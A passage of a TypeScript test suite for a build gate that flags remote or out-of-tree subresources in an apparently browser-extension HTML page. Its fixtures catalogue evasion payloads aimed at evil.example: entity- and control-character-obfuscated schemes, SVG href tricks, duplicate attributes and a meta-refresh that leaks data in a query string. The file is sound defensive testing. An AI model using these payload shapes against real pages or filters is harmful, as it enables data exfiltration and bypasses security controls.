    expect(findSubresourceViolations('<object data="https://evil.example/x"></object>', 'h')).toEqual([
      'h:1 — remote or out-of-tree <object data>: https://evil.example/x',
    ]);
    expect(findSubresourceViolations('<video poster="https://evil.example/p.jpg"></video>', 'h')).toEqual(
      ['h:1 — remote or out-of-tree <video poster>: https://evil.example/p.jpg'],
    );
  });

  it('checks href on <link> and <base> but not on <a>/<area>', () => {
    // <link> auto-fetches and <base> retargets every relative URL on the page — both are the
    // gate's business. An <a>/<area> is user-initiated navigation, so an outbound link in the
    // options page is legitimate and must not turn this red.
    expect(findSubresourceViolations('<link rel="stylesheet" href="./style.css">', 'h')).toEqual([]);
    expect(findSubresourceViolations('<link rel="stylesheet" href="https://cdn.example/x.css">', 'h')).toEqual(
      ['h:1 — remote or out-of-tree <link href>: https://cdn.example/x.css'],
    );
    expect(findSubresourceViolations('<base href="https://evil.example/">', 'h')).toEqual([
      'h:1 — remote or out-of-tree <base href>: https://evil.example/',
    ]);
    expect(findSubresourceViolations('<a href="https://chatgpt.com">docs</a>', 'h')).toEqual([]);
    expect(
      findSubresourceViolations('<area shape="rect" href="https://chatgpt.com">', 'h'),
    ).toEqual([]);
  });

  it('flags a data: URI', () => {
    // Deliberate: no data: URI exists anywhere in src/, isLocalInTreeSrc rejects every scheme, and
    // allowing the scheme here would also admit `data:text/html`. A future inline asset argues its
    // own allowance rather than inheriting one nobody reviewed.
    expect(findSubresourceViolations('<img src="data:image/png;base64,iVBOR">', 'h')).toEqual([
      'h:1 — remote or out-of-tree <img src>: data:image/png;base64,iVBOR',
    ]);
  });

  it('flags a remote CSS url() in an inline style block', () => {
    const html = '<style>\nbody { background: url(https://evil.example/bg.png); }\n</style>';
    expect(findSubresourceViolations(html, 'h')).toEqual(['h:2 — remote or out-of-tree CSS url(): https://evil.example/bg.png']);
  });

  it('flags a remote CSS @import in either form', () => {
    // `@import` accepts a bare string, which the url() scan does not see. It pulls a whole remote
    // stylesheet, which can then pull further subresources of its own.
    expect(findSubresourceViolations('<style>@import "https://evil.example/x.css";</style>', 'h')).toEqual([
      'h:1 — remote or out-of-tree CSS @import: https://evil.example/x.css',
    ]);
    expect(findSubresourceViolations("<style>@import url('https://evil.example/x.css');</style>", 'h')).toEqual([
      'h:1 — remote or out-of-tree CSS url(): https://evil.example/x.css',
    ]);
    // CSS needs no whitespace between the at-keyword and the string, and this shape passed while
    // the spaced one was caught.
    expect(findSubresourceViolations('<style>@import"https://evil.example/x.css";</style>', 'h')).toEqual([
      'h:1 — remote or out-of-tree CSS @import: https://evil.example/x.css',
    ]);
    expect(findSubresourceViolations('<style>@import "./theme.css";</style>', 'h')).toEqual([]);
  });

  it('allows a local CSS url(), quoted or bare', () => {
    expect(findSubresourceViolations('<style>body{background:url(./bg.png)}</style>', 'h')).toEqual([]);
    expect(findSubresourceViolations('<style>body{background:url("./bg.png")}</style>', 'h')).toEqual([]);
  });

  it('allows relative in-tree assets', () => {
    expect(findSubresourceViolations('<img src="./icons/icon16.png">', 'h')).toEqual([]);
    expect(findSubresourceViolations('<script type="module" src="./main.ts"></script>', 'h')).toEqual([]);
  });

  it('ignores an attribute the browser never fetches', () => {
    // `data-src` is inert markup — no fetch without a lazy-loader, and no such code exists in src/.
    expect(findSubresourceViolations('<img data-src="https://evil.example/x.png">', 'h')).toEqual([]);
  });

  it('ignores a valueless URL attribute', () => {
    expect(findSubresourceViolations('<img src>', 'h')).toEqual([]);
  });

  it('flags an out-of-tree relative path', () => {
    expect(findSubresourceViolations('<img src="../../node_modules/foo/x.png">', 'h')).toEqual([
      'h:1 — remote or out-of-tree <img src>: ../../node_modules/foo/x.png',
    ]);
  });

  it('sees through a scheme hidden by URL/HTML normalization', () => {
    // Both forms resolve to https://evil.example/… in a real browser and both passed a raw-text
    // scheme test. The URL parser strips ASCII tab/LF/CR anywhere in the input; the HTML parser
    // decodes character references before it ever gets there.
    expect(findSubresourceViolations('<img src="ht\ttps://evil.example/tab.png">', 'h')).toEqual([
      'h:1 — remote or out-of-tree <img src>: ht\ttps://evil.example/tab.png',
    ]);
    expect(findSubresourceViolations('<img src="&#x68;ttps://evil.example/hex.png">', 'h')).toEqual([
      'h:1 — remote or out-of-tree <img src>: &#x68;ttps://evil.example/hex.png',
    ]);
    expect(findSubresourceViolations('<img src="&#104;ttps://evil.example/dec.png">', 'h')).toEqual([
      'h:1 — remote or out-of-tree <img src>: &#104;ttps://evil.example/dec.png',
    ]);
    // A named reference can hide a scheme too; any surviving `&` is rejected rather than decoded.
    expect(findSubresourceViolations('<img src="https&colon;//evil.example/named.png">', 'h')).toEqual([
      'h:1 — remote or out-of-tree <img src>: https&colon;//evil.example/named.png',
    ]);
  });

  it('flags the legacy background attribute', () => {
    // Chrome still maps `background` on <body>/<table>/<tr>/<td> to background-image and fetches it.
    expect(findSubresourceViolations('<body background="https://evil.example/bg.png">', 'h')).toEqual([
      'h:1 — remote or out-of-tree <body background>: https://evil.example/bg.png',
    ]);
  });

  it('does not treat a tag-shaped attribute VALUE as a tag', () => {
    // A real parser yields no <img> here (measured) — the string is just the div's attribute value.
    // The tag scan must resume after the div's own `>`, or it re-matches inside what it just read.
    expect(
      findSubresourceViolations(`<div data-html="<img src='https://evil.example/x.png'>"></div>`, 'h'),
    ).toEqual([]);
  });

  it('flags src="" even though it resolves same-origin', () => {
    // Over-report, stated so the behaviour is not mistaken for the valueless-attribute skip above.
    expect(findSubresourceViolations('<img src="">', 'h')).toEqual([
      'h:1 — remote or out-of-tree <img src>: ',
    ]);
  });

  it('names each offending target separately in a multi-candidate srcset', () => {
    expect(
      findSubresourceViolations('<img srcset="https://a.example/1.png 1x, https://b.example/2.png 2x">', 'h'),
    ).toEqual([
      'h:1 — remote or out-of-tree <img srcset>: https://a.example/1.png',
      'h:1 — remote or out-of-tree <img srcset>: https://b.example/2.png',
    ]);
  });

  it('agrees with a real parser on the tokenization-differential shapes', () => {
    // The class of payload that produced five false negatives in the `<script>` half. Each
    // expectation below was diffed against happy-dom's actual parse, not reasoned about.
    // A `>` inside a quoted value does not end the tag, so the only real src is the local one.
    expect(
      findSubresourceViolations('<img data-x="a src=https://evil.example/x.png>" src="./ok.png">', 'h'),
    ).toEqual([]);
    // A quote in NAME position does not open a value: the parser closes tag 1 at the first `>`,
    // leaving it srcless, and the remote src belongs to tag 2.
    expect(findSubresourceViolations('<img x"><img src="https://evil.example/y.png">', 'h')).toEqual([
      'h:1 — remote or out-of-tree <img src>: https://evil.example/y.png',
    ]);
    // A quote inside an UNQUOTED value is a literal; the value ends at the whitespace.
    expect(findSubresourceViolations('<img data-x=a"b src="https://evil.example/z.png">', 'h')).toEqual([
      'h:1 — remote or out-of-tree <img src>: https://evil.example/z.png',
    ]);
    // Attribute and tag names are case-insensitive to the parser, so they must be here too.
    expect(findSubresourceViolations('<IMG SRC="https://evil.example/upper.png">', 'h')).toEqual([
      'h:1 — remote or out-of-tree <img src>: https://evil.example/upper.png',
    ]);
    // Left open at EOF the parser drops the tag, so nothing fetches — flagged anyway, on purpose.
    expect(findSubresourceViolations('<img src="https://evil.example/eof.png"', 'h')).toEqual([
      'h:1 — remote or out-of-tree <img src>: https://evil.example/eof.png',
    ]);
  });

  it('flags an SVG <image> on either href spelling', () => {
    // The residual PR #42 left open. `<svg><image>` is SVG's `<img>` — it fetches automatically on
    // both the SVG 1.1 `xlink:href` and the SVG 2 plain `href`, but `href` used to be checked on
    // `<link>`/`<base>` only, so neither form was read. Both parses measured against happy-dom:
    // the element lands in the SVG namespace with the attribute intact, prefix and all.
    expect(
      findSubresourceViolations('<svg><image xlink:href="https://evil.example/x.png"/></svg>', 'h'),
    ).toEqual(['h:1 — remote or out-of-tree <image xlink:href>: https://evil.example/x.png']);
    expect(
      findSubresourceViolations('<svg><image href="https://evil.example/x.png"/></svg>', 'h'),
    ).toEqual(['h:1 — remote or out-of-tree <image href>: https://evil.example/x.png']);
    expect(findSubresourceViolations('<svg><image xlink:href="./ok.png"/></svg>', 'h')).toEqual([]);
  });

  it('sees an SVG <image> target through case and normalization', () => {
    // Same three evasions the `<img src>` case already pins, re-checked on the new attribute:
    // attribute names are case-insensitive to the parser, the URL parser strips ASCII tab/LF/CR,
    // and character references are decoded before either sees the value (all measured on the SVG
    // form specifically — happy-dom returns the decoded `https://…` for the reference case).
    expect(
      findSubresourceViolations('<svg><IMAGE XLINK:HREF="https://evil.example/u.png"/></svg>', 'h'),
    ).toEqual(['h:1 — remote or out-of-tree <image xlink:href>: https://evil.example/u.png']);
    expect(
      findSubresourceViolations('<svg><image href="ht\ttps://evil.example/tab.png"/></svg>', 'h'),
    ).toEqual(['h:1 — remote or out-of-tree <image href>: ht\ttps://evil.example/tab.png']);
    expect(
      findSubresourceViolations('<svg><image href="&#x68;ttps://evil.example/hex.png"/></svg>', 'h'),
    ).toEqual(['h:1 — remote or out-of-tree <image href>: &#x68;ttps://evil.example/hex.png']);
  });

  it('flags href on any other tag rather than enumerating which SVG elements fetch', () => {
    // `<feImage>` fetches like an `<image>`; `<use>` is specified to resolve an external document;
    // the reference-taking elements (`<pattern>`, `<textPath>`, `<mpath>`, the gradients, the
    // animation elements) are the ones whose off-document behaviour varies by browser and version.
    // That boundary is exactly what an allowlist would have to get right, so there is no allowlist:
    // every tag but `<a>`/`<area>` is checked, and a tag that turns out not to fetch costs an
    // over-report instead of a hole.
    expect(
      findSubresourceViolations('<svg><filter><feImage href="https://evil.example/f.png"/></filter></svg>', 'h'),
    ).toEqual(['h:1 — remote or out-of-tree <feimage href>: https://evil.example/f.png']);
    expect(
      findSubresourceViolations('<svg><use href="https://evil.example/x.svg#a"/></svg>', 'h'),
    ).toEqual(['h:1 — remote or out-of-tree <use href>: https://evil.example/x.svg#a']);
    expect(
      findSubresourceViolations('<svg><pattern xlink:href="https://evil.example/p.svg#x"/></svg>', 'h'),
    ).toEqual(['h:1 — remote or out-of-tree <pattern xlink:href>: https://evil.example/p.svg#x']);
    // Navigation stays exempt in the SVG namespace too, on both spellings.
    expect(findSubresourceViolations('<svg><a href="https://chatgpt.com">t</a></svg>', 'h')).toEqual([]);
    expect(
      findSubresourceViolations('<svg><a xlink:href="https://chatgpt.com">t</a></svg>', 'h'),
    ).toEqual([]);
  });

  it('flags a rebound href prefix even though it never reaches a fetch', () => {
    // Raised in review as a possible evasion, then measured and found inert: an HTML document binds
    // no namespaces, so `xmlns:xl` does nothing and `xl:href` lands as a null-namespace attribute
    // named literally `xl:href` — happy-dom reports localName `xl:href` and
    // `getAttributeNS(xlink, 'href') === null`, against namespace `xlink` / localName `href` for the
    // real spelling. Only the parser's fixed adjustment table produces an XLink href. It is flagged
    // anyway: matching every `*:href` is what keeps this from depending on that table staying as
    // remembered, and the cost is this over-report on markup that fetches nothing.
    expect(
      findSubresourceViolations(
        '<svg xmlns:xl="http://www.w3.org/1999/xlink"><image xl:href="https://evil.example/ns.png"/></svg>',
        'h',
      ),
    ).toEqual(['h:1 — remote or out-of-tree <image xl:href>: https://evil.example/ns.png']);
  });

  it('flags a <meta http-equiv=refresh> that navigates off-origin', () => {
    // The one vector with no runtime control behind it — the CSP restricts subresources and code,
    // and Chrome dropped `navigate-to`. The query string carries whatever the page read, exactly
    // like the `<img src>` payload, but nothing downstream would stop this one.
    expect(
      findSubresourceViolations(
        '<meta http-equiv="refresh" content="0;url=https://evil.example/?d=leak">',
        'h',
      ),
    ).toEqual([
      'h:1 — remote or out-of-tree <meta http-equiv=refresh>: https://evil.example/?d=leak',
    ]);
  });

  it('reads the refresh target through every content= form the parser accepts', () => {
    // `url=` is optional, the separator may be `,`, the URL may be quoted inside the attribute, and
    // both keywords are case-insensitive. Each form was run through happy-dom first: the
    // character-reference case arrives at the refresh algorithm already decoded to `https://…`.
    expect(
      findSubresourceViolations('<meta http-equiv="refresh" content="0;https://evil.example/n">', 'h'),
    ).toEqual(['h:1 — remote or out-of-tree <meta http-equiv=refresh>: https://evil.example/n']);
    expect(
      findSubresourceViolations('<meta http-equiv="REFRESH" content="0; URL=\'https://evil.example/q\'">', 'h'),
    ).toEqual(['h:1 — remote or out-of-tree <meta http-equiv=refresh>: https://evil.example/q']);
    expect(
      findSubresourceViolations('<meta http-equiv="refresh" content="5,url=https://evil.example/c">', 'h'),
    ).toEqual(['h:1 — remote or out-of-tree <meta http-equiv=refresh>: https://evil.example/c']);
    // Reported decoded rather than raw, because the value is now decoded before the grammar runs.
    expect(
      findSubresourceViolations(
        '<meta http-equiv="refresh" content="0;url=&#x68;ttps://evil.example/hex">',
        'h',
      ),
    ).toEqual(['h:1 — remote or out-of-tree <meta http-equiv=refresh>: https://evil.example/hex']);
  });

  it('decodes a character reference hiding in the refresh SYNTAX, not just the URL', () => {
    // Three payloads found in review, each measured in happy-dom as arriving at the refresh
    // algorithm fully decoded — `http-equiv="refresh"`, `content="0;url=https://evil.example/leak"` —
    // and each returning `[]` from the first cut, which compared and parsed raw text and only
    // decoded the URL it had already failed to extract. The entity can sit in the pragma name, the
    // separator, or the `url` keyword; decoding has to precede the grammar, not follow it.
    for (const html of [
      '<meta http-equiv="ref&#x72;esh" content="0;url=https://evil.example/leak">',
      '<meta http-equiv="refresh" content="0&#59;url=https://evil.example/leak">',
      '<meta http-equiv="refresh" content="0;u&#x72;l=https://evil.example/leak">',
      '<meta http-equiv="refresh" content="&#48;;url=https://evil.example/leak">',
    ]) {
      expect(findSubresourceViolations(html, 'h'), html).toEqual([
        'h:1 — remote or out-of-tree <meta http-equiv=refresh>: https://evil.example/leak',
      ]);
    }
  });

  it('strips the C0 controls the URL parser strips but String.trim() does not', () => {
    // `&#1;` decodes to U+0001, which the HTML tokenizer keeps verbatim (only U+0000 is remapped)
    // and the URL parser then strips as leading C0-control-or-space — so the value resolves to
    // `https://evil.example/…` and fetches. JS `.trim()` leaves 26 such code points in place
    // (U+0001–U+0008, U+000E–U+001F, enumerated against Node's URL parser), so the scheme test saw
    // a control character in scheme position and called the value local. Found in review; it hits
    // the pre-existing `<img src>` path as well as the new refresh one, which is why it is fixed in
    // normalizeUrlValue rather than at either call site.
    expect(findSubresourceViolations('<img src="&#1;https://evil.example/x.png">', 'h')).toEqual([
      'h:1 — remote or out-of-tree <img src>: &#1;https://evil.example/x.png',
    ]);
    expect(
      findSubresourceViolations(
        '<meta http-equiv="refresh" content="0;url=&#1;https://evil.example/?d=leak">',
        'h',
      ),
    ).toEqual([
      'h:1 — remote or out-of-tree <meta http-equiv=refresh>: https://evil.example/?d=leak',
    ]);
    // A leading NBSP is NOT stripped by the URL parser, so that value really does stay same-origin —
    // the narrower strip is correct here, not a regression from dropping `.trim()`.
    expect(findSubresourceViolations('<img src=" ./ok.png">', 'h')).toEqual([]);
  });

  it('flags a remote imagesrcset on a preload link', () => {
    // What `<link rel="preload" as="image">` actually fetches from when present; it takes the same
    // candidate-list grammar as `srcset`. Raised in review as a one-token gap.
    expect(
      findSubresourceViolations(
        '<link rel="preload" as="image" imagesrcset="https://evil.example/p.png 1x">',
        'h',
      ),
    ).toEqual(['h:1 — remote or out-of-tree <link imagesrcset>: https://evil.example/p.png']);
    expect(
      findSubresourceViolations('<link rel="preload" as="image" imagesrcset="./p.png 1x">', 'h'),
    ).toEqual([]);
  });

  it('is not fooled by a duplicate http-equiv or content attribute', () => {
    // Both payloads navigate off-origin in a real parser — measured, not reasoned: happy-dom keeps
    // the FIRST occurrence of a duplicate attribute and drops the rest, so the trailing
    // `http-equiv="not-refresh"` and the trailing inert `content="0"` are discarded. A last-wins
    // read of the attribute list returned `[]` for both, which is the shape of hole this whole file
    // exists to prevent. Found in review; pinned so the union rule cannot quietly regress.
    expect(
      findSubresourceViolations(
        '<meta content="0;url=https://evil.example/dup1" http-equiv="refresh" http-equiv="not-refresh">',
        'h',
      ),
    ).toEqual(['h:1 — remote or out-of-tree <meta http-equiv=refresh>: https://evil.example/dup1']);
    expect(
      findSubresourceViolations(
        '<meta http-equiv="refresh" content="0;url=https://evil.example/dup2" content="0">',
        'h',
      ),
    ).toEqual(['h:1 — remote or out-of-tree <meta http-equiv=refresh>: https://evil.example/dup2']);
    // The mirror case: a real parser keeps the leading `not-refresh` and never navigates, so this
    // one is an over-report. Asserted rather than tolerated silently — taking the union is what
    // keeps the gate from depending on a tokenizer rule it cannot observe, and the cost is this.
    expect(
      findSubresourceViolations(
        '<meta http-equiv="not-refresh" http-equiv="refresh" content="0;url=https://evil.example/dup3">',
        'h',
      ),
    ).toEqual(['h:1 — remote or out-of-tree <meta http-equiv=refresh>: https://evil.example/dup3']);
  });

  it('leaves a same-document refresh and a non-refresh <meta> alone', () => {
    // `content="0"` reloads the current document — same origin, nothing to leak — and so does an
    // empty `url=`. A `<meta>` that is not a refresh pragma carries an inert `content`, which must
    // not be classified as a URL at all or every `<meta name="description">` reddens the gate.
    expect(findSubresourceViolations('<meta http-equiv="refresh" content="0">', 'h')).toEqual([]);
    expect(findSubresourceViolations('<meta http-equiv="refresh" content="0;url=">', 'h')).toEqual([]);
    expect(
      findSubresourceViolations('<meta http-equiv="refresh" content="0;url=./options.html">', 'h'),
    ).toEqual([]);
    expect(
      findSubresourceViolations('<meta name="description" content="https://evil.example/">', 'h'),
    ).toEqual([]);
    expect(
      findSubresourceViolations('<meta http-equiv="content-type" content="text/html">', 'h'),
    ).toEqual([]);
    expect(findSubresourceViolations('<meta charset="utf-8">', 'h')).toEqual([]);
  });

  it('reports every offending tag in a file, with its line', () => {
    const html = '<img src="https://a.example/1.png">\n<img src="./ok.png">\n<iframe src="https://b.example/"></iframe>';
    expect(findSubresourceViolations(html, 'h')).toEqual([
      'h:1 — remote or out-of-tree <img src>: https://a.example/1.png',
      'h:3 — remote or out-of-tree <iframe src>: https://b.example/',
    ]);
  });
});
